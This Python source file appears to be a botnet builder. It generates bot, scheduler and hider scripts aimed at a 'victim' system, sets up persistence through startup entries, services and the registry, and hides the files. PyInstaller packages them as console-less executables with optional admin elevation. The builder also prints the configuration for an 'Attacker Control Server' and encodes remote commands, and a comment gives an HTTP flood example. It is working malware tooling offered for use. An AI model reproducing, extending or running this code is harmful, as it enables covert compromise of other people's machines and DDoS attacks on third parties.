import base64
import hashlib
from Crypto.Cipher import AES
from Crypto import Random
from datetime import datetime
import os
from assets import scheduler_hidder_win
import sys
import PyInstaller.__main__
import string
import shutil
import json

pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)


# Load Build Infos
print("... Loading build.info ...")

with open('assets/build.info', 'r') as build_info_details:
	build_info = build_info_details.readlines()

for i in range(len(build_info)):
	if build_info[i].startswith('#') or build_info[i]=='\n':
		build_info[i]=0
	else:
		build_info[i]=build_info[i].strip().replace('=', '":')

for i in range(build_info.count(0)):
	build_info.remove(0)
build_info=json.loads("{\""+", \"".join(build_info)+"}")



# Set Basic Data Variables
if build_info['victim_System'].upper()=='WIN' or build_info['victim_System'].upper()=='WINDOWS':
	extension_to_use = '.exe'
	required_locations = build_info['win_locations_to_use']
	exec_locations=build_info['win_locations_to_use']
	add_to_startup = build_info['win_add_to_startup']
	add_to_service = build_info['win_add_to_service_jobs']
	add_to_registry = build_info['win_add_to_registry']
	run_as_admin = build_info['win_run_as_admin']

def gen_botnetID():
	new_botnetID = hashlib.md5(os.urandom(64)).hexdigest()+hashlib.md5(os.urandom(64)).hexdigest()
	return new_botnetID

def gen_executable(key, host_list, webpage_location_dict, time_interval, reset_time_interval):
	botnet_id = gen_botnetID()

	# Set botnet_locations Manually
	# botnet_locations = """(f'{Path.home()}\\\\Documents\\\\"""+build_info['botnet_Name']+extension_to_use+"""', f'{Path.home()}\\\\AppData\\\\Roaming\\\\"""+scheduler_hidder_win.botnetName()+scheduler_hidder_win.extension_to_use_for_scheduler_works()+"""', f'{Path.home()}\\\\Desktop\\\\"""+scheduler_hidder_win.botnetName()+scheduler_hidder_win.extension_to_use_for_scheduler_works()+"""', f'{Path.home()}\\\\"""+scheduler_hidder_win.botnetName()+scheduler_hidder_win.extension_to_use_for_scheduler_works()+"""')"""
	botnet_locations = scheduler_hidder_win.exec_locations_format(required_locations).replace("',", f"\\\\{build_info['botnet_Name']}{extension_to_use}',")
	
	# if scheduler_hidder_win.extension_to_use_for_scheduler_works()=='.py':
	# 	file_type = 'python'
	# elif scheduler_hidder_win.extension_to_use_for_scheduler_works()=='.exe':
	# 	file_type = 'executable'

	if build_info['generate_executables']=="True":
		file_type='executable'
	else:
		file_type='python'
	# Botnet

	payload_data = f"""
worker_id=\"{botnet_id}\"
key={key}
host_list={host_list}
webpage_location_dict={webpage_location_dict}
time_interval={time_interval}
reset_time_interval={reset_time_interval}
executable_locations = {scheduler_hidder_win.exec_locations_format(required_locations)}
botnet_name = '{build_info['botnet_Name']}{extension_to_use}'
file_type = '{file_type}'
exec_fileName = '{build_info['exec_fileName']}'

"""
	web_page_lst = []
	for i in webpage_location_dict.values():
		web_page_lst+=i

	if os.path.isdir('created_botnets')==False:
		os.mkdir(f'created_botnets')
	os.mkdir(f'created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}')
	os.mkdir(f'created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/sourceFiles')
	os.mkdir(f'created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/executables')

	with open('assets/scheduler_templete.py', 'r') as scheduler_templete:
		scheduler_templete_content = scheduler_templete.read()

	with open('assets/botnet.py', 'r') as botnet_templete:
		botnet_templete_content = botnet_templete.read()

	with open(f'created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/sourceFiles/botnet-{botnet_id}.py', 'w') as botnet:
		botnet.write(f"exec_fileName='{build_info['exec_fileName']}'\n"+botnet_templete_content)

	# shutil.copyfile('assets/botnet.py' , f'created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/sourceFiles/botnet-{botnet_id}.py')

	with open(f'created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/sourceFiles/botnet-{botnet_id}_scheduler.py', 'w') as scheduler:
		scheduler.write("from pathlib import Path\n"+payload_data+scheduler_templete_content)

	with open(f'created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/botnet-{botnet_id}_details.txt', 'w') as botnet_payload:
		botnet_payload.write(payload_data+f'Creation Date = {str(datetime.date(datetime.now()))}')

	with open(f'created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/sourceFiles/botnet-{botnet_id}_scheduler_hidder.py', 'w') as scheduler_hidder:
		scheduler_hidder.write(scheduler_hidder_win.make_schedulerHidder_file(build_info['victim_System'], build_info['botnet_Name'], build_info['scheduler_Name'], build_info['exec_fileName'], exec_locations, build_info['hide_files'], add_to_startup, add_to_service, add_to_registry))
		
	with open(f'created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/executables/{build_info["exec_fileName"]}', 'w') as exec_file:
		exec_file.write('')

	with open('assets/created_botnetIDs.txt', 'a') as created_botnetID_list:
		created_botnetID_list.write(botnet_id+"| Created on "+str(datetime.date(datetime.now()))+"\n")

	print(f"""\n
Botnet source scripts have been created in

created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/botnet-{botnet_id}_details.txt
created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/sourceFiles/botnet-{botnet_id}.py
created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/sourceFiles/botnet-{botnet_id}_scheduler.py
created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/sourceFiles/botnet-{botnet_id}_scheduler_hidder.py
created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/executables/{build_info['exec_fileName']}
""")

	if build_info['generate_executables']!='True':
		print("Default: File extension as a scheduler is selected as .py | python environment as well as required modules are required in victim system to run the botnet")


	final_detail = f"""\n\n

Botnet_IDs has been updated in

./assets/created_botnetIDs.txt

Add the below following json data in server \'botnetIDs.json\' file
After which the request will be accepted from botnets

"{botnet_id}":{{
	"command":"",
	"key": "{base64.b64encode(key).decode()}",
	"access":{str(web_page_lst).replace("'", '"')}

}}
"""


	ask = input("Generate Executables ? Y/N\n>>> ").upper()
	if ask=='Y':

		# Generate scheduler Executable
		# https://pyinstaller.org/en/stable/usage.html
		# PyInstaller.__main__.run([f'assets/botnet.py', '--onefile', '--noconsole', '--clean', f'-n {scheduler_hidder_win.botnetName()}', ])
		PyInstaller.__main__.run([f'created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/sourceFiles/botnet-{botnet_id}.py', '--onefile', '--noconsole', f'--icon={build_info["botnet_IconLocation"]}', f'-n {build_info["botnet_Name"]}', ])
		PyInstaller.__main__.run([f'created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/sourceFiles/botnet-{botnet_id}_scheduler.py', '--onefile', '--noconsole', f'--icon={build_info["scheduler_IconLocation"]}', f'-n {build_info["scheduler_Name"]}', ])
		
		if run_as_admin == 'True':
			PyInstaller.__main__.run([f'created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/sourceFiles/botnet-{botnet_id}_scheduler_hidder.py', '--onefile', '--noconsole', f'--icon={build_info["scheduler_hidder_IconLocation"]}', f'-n {build_info["scheduler_hidder_Name"]}', '--uac-admin'])
		else:
			PyInstaller.__main__.run([f'created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/sourceFiles/botnet-{botnet_id}_scheduler_hidder.py', '--onefile', '--noconsole', f'--icon={build_info["scheduler_hidder_IconLocation"]}', f'-n {build_info["scheduler_hidder_Name"]}'])
		
		# Error in copying files
		if build_info['victim_System']=='WIN' or build_info['victim_System']=='WINDOWS':
			shutil.copy(f'dist/ {build_info["botnet_Name"]}{extension_to_use}' , f'created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/executables/{build_info["botnet_Name"]}{extension_to_use}')
			shutil.copy(f'dist/ {build_info["scheduler_Name"]}{extension_to_use}' , f'created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/executables/{build_info["scheduler_Name"]}{extension_to_use}')
			shutil.copyfile(f'dist/ {build_info["scheduler_hidder_Name"]}{extension_to_use}' , f'created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/executables/{build_info["scheduler_hidder_Name"]}{extension_to_use}')

		# for Linux
		elif build_info['victim_System']=='LINUX':
			shutil.copy(f'dist/ {build_info["botnet_Name"]}{extension_to_use}' , f'created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/executables/')
			shutil.copy(f'dist/ {build_info["scheduler_Name"]}{extension_to_use}' , f'created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/executables/')
			shutil.copy(f'dist/ {build_info["scheduler_hidder_Name"]}{extension_to_use}' , f'created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/executables/')

		print(f"""\n\nFind the Executable at /dist directory

Binary Locations:

	botnet.py -> created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}\\executables\\{build_info['botnet_Name']}{extension_to_use}
	botnet-{botnet_id}_scheduler.py -> created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}\\executables\\{build_info['scheduler_Name']}{extension_to_use}
	botnet-{botnet_id}_scheduler_hidder.py -> created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}\\executables\\{build_info['scheduler_hidder_Name']}{extension_to_use}

	Currently executables are not stable, it may/mayn't lead to crash of Windows System in which it is running,
	Please Use Virtual Environment For testing, or it may some how lead to freezing of your main system

	Use at your own Risk !!!

""")

		
		
	with open(f'created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/botnet-{botnet_id}_details.txt', 'a') as botnet_payload:
		botnet_payload.write(final_detail)

	if extension_to_use=='.py':
		print("Default: File extension as a scheduler is selected as .py | python environment as well as required modules are required in victim system to run the botnet")
		print(f"""If you want to use the python files located at created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))} then:
Rename: created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/botnet-{botnet_id}.py -> {build_info['botnet_Name']}{extension_to_use}
Rename: created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/botnet-{botnet_id}_scheduler.py -> {build_info['scheduler_Name']}{extension_to_use}
Rename: created_botnets/{botnet_id}-{str(datetime.date(datetime.now()))}/botnet-{botnet_id}_scheduler_hidder.py -> {build_info['scheduler_hidder_Name']}{extension_to_use}

""")

	print(final_detail)



def exec_value(botnet_id):
	# {"repeat":3, "time_interval":5, "reset_time_interval":10, "exec":"-u=http://192.168.157.135 -rT=GET -tprT=GET:150 -ppi=100 -t=5 -tof=1000"}'
	data = {}
	
	# Ask for repeat Value
	ask=(input("\nDo you want to add 'repeat' value ? Y/N (default: N)\n>>> ")).upper()
	if ask=='Y':
		value = int(input("Enter 'repeat' value in int\n>>> "))
		data.update({'repeat':value})

	# Ask for time_interval Value
	ask=(input("\nDo you want to add 'Time Interval' value ? Y/N (default: N)\n>>> ")).upper()
	if ask=='Y':
		value = int(input("Enter 'Time Interval' value in int (1->1sec)\n>>> "))
		data.update({'time_interval':value})

	# Ask for reset time interval Value
	ask=(input("\nDo you want to add 'Reset Time Interval' value ? Y/N (default: N)\n>>> ")).upper()
	if ask=='Y':
		value = int(input("Enter 'Reset Time Interval' value in int (1->1sec)\n>>> "))
		data.update({'reset_time_interval':value})

	# Ask for command arguments Value
	ask=(input("\nDo you want to add 'Arguments' to execute ? Y/N (default: N)\n>>> ")).upper()
	if ask=='Y':
		value = input("Enter 'Arguments' to execute\n>>> ")
		data.update({'exec':value})

	print('Command Data -> ', data)
	command = base64.b64encode(str(data).replace('\'', '"').encode()).decode()
	return command


def main():

	ask = input("""
[1] Generate Botnet Executables
[2] Add value to execute by the remote botnet

>>> """)
	if ask=='1':
		key = Random.new().read(AES.block_size)
		host_list=[]
		webpage_location_dict = {}
		value = 0
		while value!='finish':
			value = input("Please Enter host_detail to use \n(Example: 10.10.10.10:80) [Input \'finish\' after entering every host_detail\n>>>")
			if value!='finish':
				host_list+=[value]

		print("\n")
		value = 0
		for host in host_list:
			while value!='finish':
				value = input("Please Enter location to use \n(Example: botnet_location1_abc_123) [Input \'finish\' after entering every host_detail\n>>>")
				if value!='finish':
					if host in webpage_location_dict:
						webpage_location_dict[host]+=[value]
					else:
						webpage_location_dict.update({host:[value]})

		print("\n")

		value = input("Please Enter \'Time Interval\' to use \n(Example: 120)\n[1 -> 1sec]\t[120 -> 2min] \n[Input \'default\' to use default value\n>>>")

		print("\n")

		# Time Interval assign value
		if value=='default':
			time_interval = 'random.randint(30, 120)'
		elif int(value):
			time_interval = int(value)
		else:
			print('Time Interval not correctly specified')
			sys.exit()

		print("\n")

		# Reset Time Interval Value
		value = input("Please Enter \'Reset Time Interval\' to use \n(Example: 120)\n[1 -> 1sec]\t[120 -> 2min] \n[Input \'default\' to use default value\n>>>")

		print("\n")

		if value=='default':
			reset_time_interval = 'random.randint(900, 10800)'
		elif int(value):
			reset_time_interval = int(value)
		else:
			print('Reset Time Interval not correctly specified')
			sys.exit()

		gen_executable(key, host_list, webpage_location_dict, time_interval, reset_time_interval)
		
	elif ask=='2':
		botnet_id = input("Enter Your \'Botnet ID\' to generate Command Data\n>>> ")

		print(f"""Add {exec_value(botnet_id)} as a \'command\' value in \'botnetIDs.json\' under {botnet_id} located in Attacker Control Server""")



if __name__=="__main__":
	main()